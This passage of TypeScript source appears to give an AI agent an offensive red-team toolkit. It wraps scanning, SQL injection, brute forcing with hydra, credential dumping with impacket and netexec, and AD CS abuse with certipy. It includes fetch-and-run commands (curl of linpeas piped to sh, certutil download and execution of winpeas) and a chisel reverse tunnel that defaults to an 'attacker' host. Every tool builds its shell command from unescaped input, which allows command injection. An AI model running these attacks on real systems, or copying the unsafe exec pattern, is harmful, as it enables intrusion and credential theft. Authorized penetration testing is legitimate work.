							`Nmap open ports on ${v.target}: ${openPorts.join(", ")}`,
							["recon", "nmap", v.target],
						);
					}
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- nuclei ---
	const NucleiSchema = z.object({
		target: z.string().min(1),
		templates: z.string().optional(),
		severity: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; templates?: string; severity?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_nuclei",
			description: "Run nuclei template scan.",
			inputSchema: zodToJsonSchema(NucleiSchema),
			execute: async (input) => {
				const v = validateWithZod(NucleiSchema, input);
				let cmd = `nuclei -u ${v.target}`;
				if (v.templates) cmd += ` -t ${v.templates}`;
				if (v.severity) cmd += ` -severity ${v.severity}`;
				cmd += " -json";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					let findingCount = 0;
					for (const line of stdout.split("\n")) {
						const trimmed = line.trim();
						if (!trimmed.startsWith("{")) continue;
						try {
							const parsed = JSON.parse(trimmed) as {
								info?: { name?: string; severity?: string };
								"matched-at"?: string;
								matched_at?: string;
							};
							if (parsed.info?.name) {
								findingCount += 1;
								syncFindingToGraphAndMemory(
									v.target,
									parsed.info.name,
									parsed.info.severity ?? "info",
									parsed["matched-at"] ??
										parsed.matched_at ??
										trimmed.slice(0, 300),
								);
							}
						} catch {
							// ignore non-json line
						}
					}
					syncAssetToGraph("target", v.target, undefined, true, findingCount);
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- sqlmap ---
	const SqlmapSchema = z.object({
		url: z.string().min(1),
		param: z.string().optional(),
		level: z.number().int().optional(),
		risk: z.number().int().optional(),
	});
	tools.push(
		createTool<
			{ url: string; param?: string; level?: number; risk?: number },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_sqlmap",
			description: "Run sqlmap injection test.",
			inputSchema: zodToJsonSchema(SqlmapSchema),
			execute: async (input) => {
				const v = validateWithZod(SqlmapSchema, input);
				let cmd = `sqlmap -u "${v.url}" --batch --random-agent`;
				if (v.param) cmd += ` -p ${v.param}`;
				if (v.level) cmd += ` --level=${v.level}`;
				if (v.risk) cmd += ` --risk=${v.risk}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- ffuf ---
	const FfufSchema = z.object({
		url: z.string().min(1),
		wordlist: z.string().min(1),
	});
	tools.push(
		createTool<
			{ url: string; wordlist: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_ffuf",
			description: "Run ffuf fuzzing.",
			inputSchema: zodToJsonSchema(FfufSchema),
			execute: async (input) => {
				const v = validateWithZod(FfufSchema, input);
				const cmd = `ffuf -u ${v.url} -w ${v.wordlist} -mc all -fc 404`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- subfinder ---
	const SubfinderSchema = z.object({ domain: z.string().min(1) });
	tools.push(
		createTool<
			{ domain: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_subfinder",
			description: "Run subfinder subdomain enumeration.",
			inputSchema: zodToJsonSchema(SubfinderSchema),
			execute: async (input) => {
				const v = validateWithZod(SubfinderSchema, input);
				const cmd = `subfinder -d ${v.domain} -silent`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					const subs = stdout
						.split(/\r?\n/)
						.map((s) => s.trim().toLowerCase())
						.filter(Boolean);
					const parentId = syncAssetToGraph("domain", v.domain);
					for (const sub of subs) {
						syncAssetToGraph("subdomain", sub, parentId);
					}
					if (subs.length > 0) {
						syncTargetFactToMemory(
							`subfinder:${v.domain}`,
							`Subfinder found ${subs.length} subdomains for ${v.domain}: ${subs.slice(0, 30).join(", ")}`,
							["recon", "subfinder", v.domain],
						);
					}
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- httpx ---
	const HttpxSchema = z.object({
		input: z.string().min(1),
		flags: z.string().optional(),
	});
	tools.push(
		createTool<
			{ input: string; flags?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_httpx",
			description: "Run httpx HTTP probing.",
			inputSchema: zodToJsonSchema(HttpxSchema),
			execute: async (input) => {
				const v = validateWithZod(HttpxSchema, input);
				const flags = v.flags ?? "-title -tech-detect -status-code";
				const cmd = `echo ${v.input} | httpx ${flags}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- whatweb ---
	const WhatwebSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<
			{ target: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_whatweb",
			description: "Run whatweb technology fingerprinting.",
			inputSchema: zodToJsonSchema(WhatwebSchema),
			execute: async (input) => {
				const v = validateWithZod(WhatwebSchema, input);
				const cmd = `whatweb ${v.target}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 120000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- wafw00f ---
	const Wafw00fSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<
			{ target: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_wafw00f",
			description: "Run wafw00f WAF detection.",
			inputSchema: zodToJsonSchema(Wafw00fSchema),
			execute: async (input) => {
				const v = validateWithZod(Wafw00fSchema, input);
				const cmd = `wafw00f ${v.target}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 120000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- masscan ---
	const MasscanSchema = z.object({
		target: z.string().min(1),
		ports: z.string().optional(),
		rate: z.number().int().optional(),
	});
	tools.push(
		createTool<
			{ target: string; ports?: string; rate?: number },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_masscan",
			description: "Run masscan fast port scan.",
			inputSchema: zodToJsonSchema(MasscanSchema),
			execute: async (input) => {
				const v = validateWithZod(MasscanSchema, input);
				const ports = v.ports ?? "1-65535";
				const rate = v.rate ?? 1000;
				const cmd = `masscan ${v.target} -p${ports} --rate=${rate}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- hydra ---
	const HydraSchema = z.object({
		target: z.string().min(1),
		service: z.string().min(1),
		userlist: z.string().optional(),
		passlist: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; service: string; userlist?: string; passlist?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_hydra",
			description: "Run hydra brute force.",
			inputSchema: zodToJsonSchema(HydraSchema),
			execute: async (input) => {
				const v = validateWithZod(HydraSchema, input);
				const cmd = `hydra -L ${v.userlist ?? "users.txt"} -P ${v.passlist ?? "passwords.txt"} ${v.target} ${v.service}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- impacket runner ---
	const ImpacketSchema = z.object({
		tool: z.string().min(1),
		args: z.string().min(1),
	});
	tools.push(
		createTool<
			{ tool: string; args: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_impacket",
			description: "Run an impacket tool (secretsdump, GetUserSPNs, etc.).",
			inputSchema: zodToJsonSchema(ImpacketSchema),
			execute: async (input) => {
				const v = validateWithZod(ImpacketSchema, input);
				const cmd = `impacket-${v.tool} ${v.args}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- netexec ---
	const NetexecSchema = z.object({
		protocol: z.string().min(1),
		target: z.string().min(1),
		args: z.string().optional(),
	});
	tools.push(
		createTool<
			{ protocol: string; target: string; args?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_netexec",
			description: "Run netexec (nxc) against a target.",
			inputSchema: zodToJsonSchema(NetexecSchema),
			execute: async (input) => {
				const v = validateWithZod(NetexecSchema, input);
				const cmd = `nxc ${v.protocol} ${v.target} ${v.args ?? ""}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- certipy ---
	const CertipySchema = z.object({
		action: z.string().min(1),
		args: z.string().min(1),
	});
	tools.push(
		createTool<
			{ action: string; args: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_certipy",
			description: "Run certipy AD CS tool.",
			inputSchema: zodToJsonSchema(CertipySchema),
			execute: async (input) => {
				const v = validateWithZod(CertipySchema, input);
				const cmd = `certipy ${v.action} ${v.args}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- katana ---
	const KatanaSchema = z.object({
		target: z.string().min(1),
		flags: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; flags?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_katana",
			description: "Run katana web crawler.",
			inputSchema: zodToJsonSchema(KatanaSchema),
			execute: async (input) => {
				const v = validateWithZod(KatanaSchema, input);
				const cmd = `katana -u ${v.target} ${v.flags ?? ""}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- gau ---
	const GauSchema = z.object({ domain: z.string().min(1) });
	tools.push(
		createTool<
			{ domain: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_gau",
			description: "Run gau (get all urls).",
			inputSchema: zodToJsonSchema(GauSchema),
			execute: async (input) => {
				const v = validateWithZod(GauSchema, input);
				const cmd = `gau ${v.domain}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- linpeas ---
	tools.push(
		createTool<Record<string, never>, { command: string }>({
			name: "rt_linpeas",
			description: "Generate linpeas execution command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					command:
						"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
				};
			},
		}) as AgentTool,
	);

	// --- winpeas ---
	tools.push(
		createTool<Record<string, never>, { command: string }>({
			name: "rt_winpeas",
			description: "Generate winpeas execution command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					command:
						"certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe && winpeas.exe",
				};
			},
		}) as AgentTool,
	);

	// --- chisel ---
	const ChiselSchema = z.object({
		mode: z.enum(["server", "client"]).optional(),
		port: z.number().int().optional(),
		target: z.string().optional(),
	});
	tools.push(
		createTool<
			{ mode?: string; port?: number; target?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_chisel",
			description: "Execute chisel tunnel command.",
			inputSchema: zodToJsonSchema(ChiselSchema),
			execute: async (input) => {
				const v = validateWithZod(ChiselSchema, input);
				const port = v.port ?? 8080;
				const cmd =
					v.mode === "server"
						? `chisel server -p ${port} --reverse`
						: `chisel client ${v.target ?? "http://attacker:8080"} R:socks`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- proxychains ---
	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_proxychains",
			description: "Execute proxychains command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "proxychains4 -q echo test";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

}
